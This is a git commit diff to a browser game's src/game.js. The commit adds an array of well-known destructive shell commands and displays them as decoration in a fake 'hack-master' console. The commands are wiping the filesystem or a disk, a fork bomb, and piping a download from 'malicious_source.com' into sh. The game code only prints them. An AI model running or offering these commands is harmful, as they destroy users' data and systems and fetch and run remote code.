c6aabe59fdabe93e8a758df5b7809da0a45ea440
Torinberger <torinberger@torinberger.com>
2018-06-07 10:04:27 +1000

    dynamic dangerous command loading, kek

--- src/game.js
+++ src/game.js
@@ -1,6 +1,10 @@
 
+var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda"]
+
 // # Console
 
 $(document).ready(function () {
-  $("#console-text").append("<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> sudo rm -rf /</p>");
+  for (var i = 0; i < commands.length; i++) {
+    $("#console-text").append("<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[i]+"</p>");
+  }
 });
